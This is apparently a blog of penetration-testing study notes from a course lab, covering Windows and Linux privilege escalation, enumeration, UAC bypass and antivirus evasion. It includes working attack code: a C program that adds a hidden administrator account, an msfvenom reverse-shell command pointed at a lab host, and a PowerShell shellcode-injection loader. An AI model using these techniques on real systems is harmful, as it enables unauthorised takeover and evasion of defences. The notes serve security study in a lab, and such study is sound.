<h2 id="Linux-Kernel-Vulnerabilities"><a href="#Linux-Kernel-Vulnerabilities" class="headerlink" title="Linux Kernel Vulnerabilities"></a>Linux Kernel Vulnerabilities</h2><p>Lab machine: ssh <a href="mailto:&#x6e;&#x30;&#x30;&#98;&#x40;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#48;&#46;&#49;&#50;&#x39;">&#x6e;&#x30;&#x30;&#98;&#x40;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#48;&#46;&#49;&#50;&#x39;</a></p>
<p>inspecting the /etc/issue file  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname -r </span><br><span class="line">-r, --kernel-release     print the kernel release</span><br><span class="line">arch</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel ubuntu 16.04</span><br></pre></td></tr></table></figure>

<h2 id="Compile-C-C"><a href="#Compile-C-C" class="headerlink" title="Compile C/C++"></a>Compile C/C++</h2><p>match the architecture of the target machine  </p>
<h1 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h1><h2 id="Standard-wordlist"><a href="#Standard-wordlist" class="headerlink" title="Standard wordlist"></a>Standard wordlist</h2><p>Kali linux has some stored in <code>/usr/share/wordlists/</code>  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/08/Study-Notes-2021-05-08/">Study Notes - 2021/05/08</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Insecure-File-permission"><a href="#Insecure-File-permission" class="headerlink" title="Insecure File permission"></a>Insecure File permission</h1><p>system service binary has insecure permission, we can replace the binary, when the system reboot, the malicious binary will be executed with root permission  </p>
<h2 id="Use-powershell-to-list-running-servicis"><a href="#Use-powershell-to-list-running-servicis" class="headerlink" title="Use powershell to list running servicis"></a>Use powershell to list running servicis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure>
<p>Service stored in Program Files dir is more prone to have insecure permission </p>
<h2 id="Ennumerate-the-permission-of-target-service"><a href="#Ennumerate-the-permission-of-target-service" class="headerlink" title="Ennumerate the permission of target service"></a>Ennumerate the permission of target service</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="replace-the-binary-with-malicious-binary"><a href="#replace-the-binary-with-malicious-binary" class="headerlink" title="replace the binary with malicious binary"></a>replace the binary with malicious binary</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    i &#x3D; system (&quot;net user evil Ev!lpass &#x2F;add&quot;);</span><br><span class="line">    i &#x3D; system (&quot;net localgroup administrators evil &#x2F;add&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cross compile it <code>i686-w64-mingw32-gcc adduser.c -o adduser.exe</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot; &quot;C:\Program Files\Serviio\bin\ServiioService_original.exe&quot;</span><br><span class="line">move adduser.exe &quot;C:\Program Files\Serviio\bin\ServiioService.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="restart-the-service"><a href="#restart-the-service" class="headerlink" title="restart the service"></a>restart the service</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\student&gt; net stop Serviio</span><br><span class="line">System error 5 has occurred.</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure>
<h2 id="check-the-start-option-of-the-service"><a href="#check-the-start-option-of-the-service" class="headerlink" title="check the start option of the service"></a>check the start option of the service</h2><p><code>C:\Users\student&gt;wmic service where caption=&quot;Serviio&quot; get name, caption, state, startmode Caption Name StartMode State Serviio Serviio Auto Running`</code></p>
<p>check if user can reboot the system </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\student&gt;whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">Privilege Name Description State</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeShutdownPrivilege Shut down the system Disabled</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking Enabled</span><br><span class="line">SeUndockPrivilege Remove computer from docking station Disabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br><span class="line">SeTimeZonePrivilege Change the time zone Disabled</span><br></pre></td></tr></table></figure>
<p>disable means the privilege is not enabled for the running process, in our case whoami</p>
<h2 id="reboot-the-machine"><a href="#reboot-the-machine" class="headerlink" title="reboot the machine"></a>reboot the machine</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown \r \t 0   </span><br></pre></td></tr></table></figure>
<p>\r reboot, \t in 0 sec  </p>
<h2 id="log-in-with-new-evil-account"><a href="#log-in-with-new-evil-account" class="headerlink" title="log in with new evil account"></a>log in with new evil account</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop xx.xx.xx.xx -u evil -p &#96;password&#96; -g 1024x768 </span><br></pre></td></tr></table></figure>

<p>check if the new user in admin group </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure>



<h1 id="Leveraging-Unquoted-service-path"><a href="#Leveraging-Unquoted-service-path" class="headerlink" title="Leveraging Unquoted service path"></a>Leveraging Unquoted service path</h1><p>can be used in lab 10.11.0.23  -u n00b -p lab</p>
<p>When using file/dir path contain spaces, the developer should make sure it is quoted</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\My.exe</span><br><span class="line">C:\Program Files\My Program\My.exe</span><br><span class="line">C:\Program Files\My Program\My service\service.exe</span><br><span class="line"></span><br><span class="line">move adduser.exe &quot;C:\Program Files\My Program\My.exe&quot;</span><br></pre></td></tr></table></figure>


<h1 id="Windows-Kernel-Vulnerabilities-USBPcap-Case-Study"><a href="#Windows-Kernel-Vulnerabilities-USBPcap-Case-Study" class="headerlink" title="Windows Kernel Vulnerabilities: USBPcap Case Study"></a>Windows Kernel Vulnerabilities: USBPcap Case Study</h1><p>determine the version and architecture</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; &#x2F;C:&quot;System Type&quot;</span><br><span class="line">OS Name: Microsoft Windows 7 Professional</span><br><span class="line">OS Version: 6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">System Type: X86-based PC</span><br></pre></td></tr></table></figure>

<p>try to find third-party driver vulnerabiliies first  </p>
<h2 id="enumerate-the-driver"><a href="#enumerate-the-driver" class="headerlink" title="enumerate the driver"></a>enumerate the driver</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery &#x2F;v</span><br></pre></td></tr></table></figure>
<p>/v for verbose output<br>looking for third-party drivers</p>
<h2 id="search-for-exploit"><a href="#search-for-exploit" class="headerlink" title="search for exploit"></a>search for exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit USBPcap</span><br></pre></td></tr></table></figure>

<h2 id="check-the-version-of-USBPCap"><a href="#check-the-version-of-USBPCap" class="headerlink" title="check the version of USBPCap"></a>check the version of USBPCap</h2><p>To begin, we will list the contents of the Program Files directory, in search of the USBPcap directory:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;C:\Program Files&quot;</span><br><span class="line">dir </span><br><span class="line">type USBPcap.inf</span><br></pre></td></tr></table></figure>

<h2 id="Compile-C-C-on-windows"><a href="#Compile-C-C-on-windows" class="headerlink" title="Compile C/C++ on windows"></a>Compile C/C++ on windows</h2><p>Use the client machine<br>setup PATH environment variable </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1&gt; mingw-w64.bat</span><br><span class="line">gcc 41452.c -o exploit.exe</span><br></pre></td></tr></table></figure>






</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/04/23/Study-Notes-2021-04-23/">Study Notes - 2021/04/23</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Automated-Enumeration"><a href="#Automated-Enumeration" class="headerlink" title="Automated Enumeration"></a>Automated Enumeration</h1><p>windows automated enumeration tool:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Tools\privilege_escalation\windows-privesc-check-master&gt;windows-privesc-check2.exe</span><br></pre></td></tr></table></figure>

<p>-h help<br>–dump dump output<br>-G list groups </p>
<p>Linux:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;unix-privesc-check standard &gt; output.txt</span><br></pre></td></tr></table></figure>

<h1 id="Windows-privilege-escalation-examples"><a href="#Windows-privilege-escalation-examples" class="headerlink" title="Windows privilege escalation examples"></a>Windows privilege escalation examples</h1><h2 id="Windoes-privilege-and-integrity-levels"><a href="#Windoes-privilege-and-integrity-levels" class="headerlink" title="Windoes privilege and integrity levels"></a>Windoes privilege and integrity levels</h2><p>Access token assigned to a user<br>security id (sid) unique to each object including access token, user account, group account.<br>Integrity mechanism:</p>
<p>From Windows Vista onward, processes run on four integrity levels:<br>• System integrity process: SYSTEM rights<br>• High integrity process: administrative rights<br>• Medium integrity process: standard user rights<br>• Low integrity process: very restricted rights often used in sandboxed processes</p>
<h2 id="User-account-control-UAC"><a href="#User-account-control-UAC" class="headerlink" title="User account control (UAC)"></a>User account control (UAC)</h2><p>Even logged in as admin, we are operating at Medium integrity level, to switch, specifying run as administrator:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe Start-Process cmd.exe -Verb runAs  </span><br></pre></td></tr></table></figure>
<p>run cmd.exe in as administrator<br>credential prompt and consent prompt  </p>
<h2 id="User-account-control-bypass"><a href="#User-account-control-bypass" class="headerlink" title="User account control bypass"></a>User account control bypass</h2><p>allows an administrator user to bypass UAC by silently elevating our integrity level from medium to high.  </p>
<p>leverage an interesting UAC bypass based on fodhelper.exe   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\fodhelper.exe  </span><br></pre></td></tr></table></figure>

<p>In order to gather detailed information regarding the fodhelper integrity level and the permissions required to run this process, we will inspect its application manifest</p>
<p>dump the manifest of fohelper.exe:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Tools\privilege_escalation\SysinternalsSuite</span><br><span class="line">sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;requestedPrivileges&gt;</span><br><span class="line">    &lt;requestedExecutionLevel</span><br><span class="line">        level&#x3D;&quot;requireAdministrator&quot;</span><br><span class="line">    &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;requestedPrivileges&gt;</span><br><span class="line"></span><br><span class="line">&lt;autoElevate&gt;true&lt;&#x2F;autoElevate&gt;</span><br></pre></td></tr></table></figure>


</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/Study-Notes-2021-03-29/">Study Notes - 2021/03/29</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h2><p>enumerating users:<br><code>whoami</code> work both for win and linux<br>windows: <code>net user &lt;username&gt;</code><br>Linux: <code>id</code><br>reveal other users :<br>windows: <code>net user</code><br>linux: <code>cat /etc/passwd</code>  </p>
<p>enumeratin hostname:<br><code>hostname</code>  </p>
<h2 id="Enumerating-OS-version"><a href="#Enumerating-OS-version" class="headerlink" title="Enumerating OS version"></a>Enumerating OS version</h2><p>Windows: systeminfo<br>linux: <code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>uname -a</code>  </p>
<h2 id="Running-processes-and-services"><a href="#Running-processes-and-services" class="headerlink" title="Running processes and services"></a>Running processes and services</h2><p><code>tasklist /SVC</code><br>/SVC                    Displays services hosted in each process.<br><strong>Does not list task run by privieleged users</strong>  </p>
<p>linux:<br><code>ps aux</code>  </p>
<h2 id="Enumerating-Network-information"><a href="#Enumerating-Network-information" class="headerlink" title="Enumerating Network information"></a>Enumerating Network information</h2><p>windows:<br><code>ipconfig /all</code><br><code>route print</code>  route information<br><code>netstat -ano</code>  network connections<br>-a display all active tcp connections<br>-n            Displays addresses and port numbers in numerical form.<br>-o            Displays the owning process ID associated with each connection.  </p>
<p>Linux:<br><code>ifconfig -a</code><br><code>ip a</code><br><code>/sbin/route</code><br><code>ss -anp</code><br><code>netstat -anp</code>  </p>
<h2 id="Enumerating-Firewall-Status-and-Rules"><a href="#Enumerating-Firewall-Status-and-Rules" class="headerlink" title="Enumerating Firewall Status and Rules"></a>Enumerating Firewall Status and Rules</h2><p>windows:<br><code>netsh advfirewall show currentprofile</code><br>list the firewall rules:<br><code>netsh advfirewall firewall show rule name=all</code>  </p>
<p>Linux: must have root privilege to access firewall rules<br>For example, the iptables-persistent464 package on Debian Linux saves firewall rules in specific<br>files under the /etc/iptables directory by default. These files are used by the system to restore<br>netfilter465 rules at boot time. These files are often left with weak permissions, allowing them to<br>be read by any local user on the target system.  </p>
<p>grep -Hs iptables /etc/*<br>-H display file name with file number<br>-s suppress error messages </p>
<h2 id="Enumerating-Scheduled-tasks"><a href="#Enumerating-Scheduled-tasks" class="headerlink" title="Enumerating Scheduled tasks"></a>Enumerating Scheduled tasks</h2><p><code>schtasks /query /fo LIST /v</code><br>/query argument displays tasks and /FO LIST sets the output format to a simple list. We can also use /V to request verbose output.</p>
<p>Linux:<br>The Linux-based job scheduler is known as Cron.467 Scheduled tasks are listed under the /etc/cron.* directories </p>
<p>ls -lah /etc/cron*  sometimes need permision<br>-h human readable  </p>
<p>cat /etc/crontab  </p>
<p>if those script have a weak permissions, we change change it and escalate pribilege  </p>
<h2 id="Enumerating-Installed-app-and-patch-levels"><a href="#Enumerating-Installed-app-and-patch-levels" class="headerlink" title="Enumerating Installed app and patch levels"></a>Enumerating Installed app and patch levels</h2><p><code>wmic product get name, version, vendor</code>  </p>
<p>We can use wmic with the <strong>product</strong> WMI class argument followed by <strong>get</strong>, which, as the name states, is used to retrieve specific property values. We can then choose the properties we are interested in, such as name, version, and vendor  </p>
<p>note: product class only list application installed by the windows installer  </p>
<p>Similarly, and more importantly, wmic can also be used to list system-wide updates by querying the Win32_QuickFixEngineering (qfe) WMI class.<br><code>wmic qfe get Caption, Description, HotFixID, InstalledOn</code>  </p>
<p>Linux:<br>Debian based:<br>dpkg -l<br>Redhat based:<br>rpm  </p>
<h2 id="Enumerating-readble-and-writable-dirs"><a href="#Enumerating-readble-and-writable-dirs" class="headerlink" title="Enumerating readble and writable dirs"></a>Enumerating readble and writable dirs</h2><p><strong>Accesschk</strong>:<br>enumerate the Program Files directory in search of any file or directory that allows the Everyone group write permissions  </p>
<p>We will use -u to suppress errors, -w to search for write access permissions, and -s to perform a recursive search.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uws &quot;Everyone&quot; &quot;C:\Program Files&quot;</span><br></pre></td></tr></table></figure>
<p>powershell:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?&#123;$_.AccessToString -match &quot;Everyone\sAllow\s\sModify&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:  -type d to locate directories</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null  </span><br></pre></td></tr></table></figure>


<h2 id="Enumerating-Unmounted-Disks"><a href="#Enumerating-Unmounted-Disks" class="headerlink" title="Enumerating Unmounted Disks"></a>Enumerating Unmounted Disks</h2><p><code>mountvol</code><br>On Linux-based systems, we can use the <code>mount</code> command to list all mounted filesystems. In addition, the <code>/etc/fstab </code>file lists all drives that will be mounted at boot time.<br>use <code>lsblk</code> to view all available disks  </p>
<h2 id="Enumerating-Device-Drivers-and-Kernel-Modules"><a href="#Enumerating-Device-Drivers-and-Kernel-Modules" class="headerlink" title="Enumerating Device Drivers and Kernel Modules"></a>Enumerating Device Drivers and Kernel Modules</h2><p>powershell: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery.exe &#x2F;v &#x2F;fo csv | ConvertFrom-CSV | Select-Object &#39;Display Name&#39;, &#39;Start Mode&#39;, Path</span><br></pre></td></tr></table></figure>

<p>find version number of each module: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">&#x2F;sbin&#x2F;modinfo libata  </span><br></pre></td></tr></table></figure>
<p>modinfo require full path name to run  </p>
<h2 id="Enumerating-Binaries-That-AutoElevate"><a href="#Enumerating-Binaries-That-AutoElevate" class="headerlink" title="Enumerating Binaries That AutoElevate"></a>Enumerating Binaries That AutoElevate</h2><p>First, on Windows systems, we should check the status of the <code>AlwaysInstallElevated</code> registry setting. If this key is enabled (set to 1) in either <code>HKEY_CURRENT_USER</code> or <code>HKEY_LOCAL_MACHINE</code>, any user can run Windows Installer packages with elevated privileges.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>If this setting is enabled, we could craft an MSI file and run it to elevate our privileges</p>
<p>Linux:<br>find suid-marked binaries, the binary will be executed with the file owner’s permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/23/Study-Notes-2021-03-24/">Study Notes - 2021/03/24</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-23</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Antivirus-Evasion"><a href="#Antivirus-Evasion" class="headerlink" title="Antivirus Evasion"></a>Antivirus Evasion</h1><p>First generate a reverse shell:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe &gt; binary.exe  </p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/#/home/upload">https://www.virustotal.com/#/home/upload</a>  </p>
<h1 id="Detection-Method"><a href="#Detection-Method" class="headerlink" title="Detection Method"></a>Detection Method</h1><h2 id="Signiture-based"><a href="#Signiture-based" class="headerlink" title="Signiture-based"></a>Signiture-based</h2><p>blacklist technology<br>a cotinuous series of bytes that uniquely identify it -&gt; change or obfuscating the content </p>
<h2 id="Heuristic-and-Behavioral-Based-Detection"><a href="#Heuristic-and-Behavioral-Based-Detection" class="headerlink" title="Heuristic and Behavioral-Based Detection"></a>Heuristic and Behavioral-Based Detection</h2><p>Heuristic-Based Detection is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious</p>
<p>Behavioral-Based: This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and looking for behaviors or actions that are considered malicious.</p>
<h1 id="Bypassing"><a href="#Bypassing" class="headerlink" title="Bypassing"></a>Bypassing</h1><h2 id="On-disk-evasion"><a href="#On-disk-evasion" class="headerlink" title="On-disk evasion"></a>On-disk evasion</h2><p>Packers, smaller, functional equivalent -&gt; new signiture, bypass older antivirus detection  </p>
<h3 id="Obfuscator"><a href="#Obfuscator" class="headerlink" title="Obfuscator"></a>Obfuscator</h3><p>Re-organize and mutate code, more difficult to reverse engineer , dead code</p>
<h3 id="Cypters"><a href="#Cypters" class="headerlink" title="Cypters"></a>Cypters</h3><p>Add a decryption step, in memory decryotion, invisible to malware detection</p>
<p>virtualmachine emulation detection, detect if it is executed in a virtual machine envrionment  </p>
<h3 id="Software-Protectors"><a href="#Software-Protectors" class="headerlink" title="Software Protectors"></a>Software Protectors</h3><h2 id="in-memory-evasion"><a href="#in-memory-evasion" class="headerlink" title="in-memory evasion"></a>in-memory evasion</h2><p>PE injection, manipulation of its own memory, does not write any thing to disk  </p>
<h3 id="Remote-Process-Memory-Injection"><a href="#Remote-Process-Memory-Injection" class="headerlink" title="Remote Process Memory Injection"></a>Remote Process Memory Injection</h3><h3 id="Reflective-DLL-injection"><a href="#Reflective-DLL-injection" class="headerlink" title="Reflective DLL injection"></a>Reflective DLL injection</h3><p>write their own version of api to load in memory dll  </p>
<h3 id="Process-Hollowing"><a href="#Process-Hollowing" class="headerlink" title="Process Hollowing"></a>Process Hollowing</h3><p>suspend a benign process, then image changed, resume executon </p>
<h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>modify memory, inject a hook, handler, to malicious code  </p>
<h1 id="Practical-example"><a href="#Practical-example" class="headerlink" title="Practical example"></a>Practical example</h1><p>Target a specific anti-virus product </p>
<h1 id="in-memory-injection"><a href="#in-memory-injection" class="headerlink" title="in-memory injection"></a>in-memory injection</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; &#39;</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint</span><br><span class="line">flAllocationType, uint flProtect);</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,</span><br><span class="line">IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">[DllImport(&quot;msvcrt.dll&quot;)]</span><br><span class="line">public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;</span><br><span class="line">$winFunc &#x3D;</span><br><span class="line">Add-Type -memberDefinition $code -Name &quot;Win32&quot; -namespace Win32Functions -passthru;</span><br><span class="line">[Byte[]];</span><br><span class="line">[Byte[]]$sc &#x3D; &lt;place your shellcode here&gt;;</span><br><span class="line">$size &#x3D; 0x1000;</span><br><span class="line">if ($sc.Length -gt 0x1000) &#123;$size &#x3D; $sc.Length&#125;;</span><br><span class="line">$x &#x3D; $winFunc::VirtualAlloc(0,$size,0x3000,0x40);</span><br><span class="line">for ($i&#x3D;0;$i -le ($sc.Length-1);$i++) &#123;$winFunc::memset([IntPtr]($x.ToInt32()+$i),</span><br><span class="line">$sc[$i], 1)&#125;;</span><br><span class="line">$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) &#123; Start-sleep 60 &#125;;</span><br></pre></td></tr></table></figure>

<p>use load code into the memory, then execute with create thread. in powershell script </p>
<p>prevent from execution:</p>
